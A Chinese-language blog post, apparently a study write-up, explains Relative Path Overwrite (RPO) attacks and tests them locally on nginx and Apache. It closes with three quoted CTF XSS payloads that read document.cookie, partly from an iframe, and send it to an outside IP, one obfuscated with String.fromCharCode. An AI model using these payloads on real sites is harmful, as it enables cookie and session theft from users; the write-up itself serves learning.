---
title: RPO学习
date: 2019-03-20 09:58:51
tags:
- RPO
---
四篇文章，综合参考，才明白道理所在。
文章不分先后
- https://www.freebuf.com/articles/web/166731.html
- https://xz.aliyun.com/t/2220
- https://mp.weixin.qq.com/s/xEBr7JxbSTt11oiBsgc3uw
- https://www.cnblogs.com/p00mj/p/6755000.html
<!--more-->

## 简介
**RPO概念**
RPO (Relative Path Overwrite)相对路径覆盖，作为一种相对新型的攻击方式,由 Gareth Heyes在2014年首次提出，利用的是nginx服务器、配置错误的Apache服务器和浏览器之间对URL解析出现的差异，并借助文件中包含的相对路径的css或者js造成跨目录读取css或者js，甚至可以将本身不是css或者js的页面当做css或者js解析，从而触发xss等进一步的攻击手段。

**简单的来说**
服务器端的配置有问题（可能是rewrite模块的问题），正常例如/aaa/bbb/..%2f这样的url不会被解析成/aaa，但是在此处被解析成了/aaa，这意味着url地址中的%2f被解码后，被web容器识别成目录穿越。这种特性我们我们可以很容易地通过404页面来判断（对于apache2），正常情况如下：
![](/images/19-3-20_RPO学习_简介1.webp)
但是在错误配置的apache2或者nginx中，我们得到的url是/aaa。

## 攻击手法
**前提**
- 相对路径css/js加载
- 错误的apache/nginx配置

**攻击手段**
利用浏览器和服务端解析URL的不一致，利用相对路径加载XSS的事实，构造一个加载我们自己可控的页面，浏览器会将其当作js/css格式加载，导致了XSS攻击。

拿文章中的例子：
1.我们向服务器提交我们想请求的URL
`http://localhost/RPO/test/..%2findex.php`
2.（久经沙场，善于识破伪装的）服务器会把..%2f自动进行URL解码，所以实际上服务器端看到你请求的URL是下面的样子：
`http://localhost/RPO/test/../index.php`
3.我们知道../ 在URL中会被理解成上一层目录，所以服务器实际上认为你访问的是下面的URL，并把index.php的内容返回给（天真的）浏览器
`http://localhost/RPO/index.php`
4.接下来浏览器的工作就是根据URL的路径处理index.php中引用的使用相对地址的脚本，可是万万没想到，浏览器它并不认识..%2f（惊恐脸，说实话，估计它自己都不相信，在它天真的眼中一切都是没有伪装的，它看不破%2f的伪装),于是URL在它眼里依旧是那时（青涩的）模样：
`http://localhost/RPO/test/..%2findex.php`
5.此时无知的浏览器已经把..%2findex.php当成了一个文件，可它还是严格按照脚本的要求加载当前目录下的a.js文件，而对它来说现在的当前目录已变成了test，自然而然test目录下的a.js就被成功加载了。

在观看文章中对于CTF一场比赛中为什么会把
`http://39.107.33.96:20000/index.php/view/article/17776/static/js/jquery.min.js`
中`17776`识别为js文件，一直存在猜测但是不敢确定。在HenceTech的文章中明确指出了是配置问题。
![](/images/19-3-20_RPO学习_攻击手法1.png)

## 本地测试
https://www.freebuf.com/articles/web/166731.html
文章中k0rz3n自己本地搭了2个环境进行测试，我也按照文章的步骤自己搭了2个本地环境。

**第一个环境：apache和nginx的差异**
![](/images/19-3-20_RPO学习_本地测试1.png)
apache无法识别%2f，但是nginx可以。但是apache在存在.htaccess文件进行URL重写的话，可以传入`%252f`代替`\`

**本地进行RPO攻击测试**
1. nginx
![](/images/19-3-20_RPO学习_本地测试2.png)

2. apache
![](/images/19-3-20_RPO学习_本地测试3.png)
![](/images/19-3-20_RPO学习_本地测试4.png)
如图，就是使用`%252f`代替了`\`，参考[AllowEncodedSlashes](http://www.laruence.com/2010/10/26/1768.html)
这里解释下，为什么`3.html`文件会被当成`js`文件。
因为在加载`3.js`文件的url地址为：`http://localhost/RPO/index.php/page/3/3.js`,在url重写中，此次URL返回的内容如上图1是3.html的内容（经过apache重写），又因为是`script`标签引用的，所以会被当成`js`文件解析。

## payload
文中攻击的payload:
```javascript
(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,53,52,46,50,51,53,46,50,51,52,46,54,56,58,50,51,51,47)+document.cookie;
```
```javascript
    var iframe = document.createElement("iframe");
    iframe.src = "/QWB_f14g/QWB/";
    iframe.id = "frame";
    document.body.appendChild(iframe);
    iframe.onload = function (){
         var c = document.getElementById('frame').contentWindow.document.cookie;
        var n0t = document.createElement("link");
        n0t.setAttribute("rel", "prefetch");
        n0t.setAttribute("href", "http://xx.xx.xx.xx?flag=" + c);
        document.head.appendChild(n0t);
    }
```
```javascript
var iframe = document.createElement(String.fromCharCode(105,102,114,97,109,101));
iframe.src = String.fromCharCode(47,81,87,66,95,102,108,52,103,47,81,87,66,47);
iframe.id = String.fromCharCode(102,114,97,109,101);
document.body.appendChild(iframe);
iframe.onload = function (){
    var c = document.getElementById(String.fromCharCode(102,114,97,109,101)).contentWindow.document.cookie;
var n0t = document.createElement(String.fromCharCode(108,105,110,107));
n0t.setAttribute(String.fromCharCode(114,101,108), String.fromCharCode(112,114,101,102,101,116,99,104));
n0t.setAttribute(String.fromCharCode(104,114,101,102), String.fromCharCode(47,47,53,52,46,50,51,53,46,50,51,52,46,54,56,58,50,51,51,47,63,102,108,97,103,61) + c);
document.head.appendChild(n0t);
}
```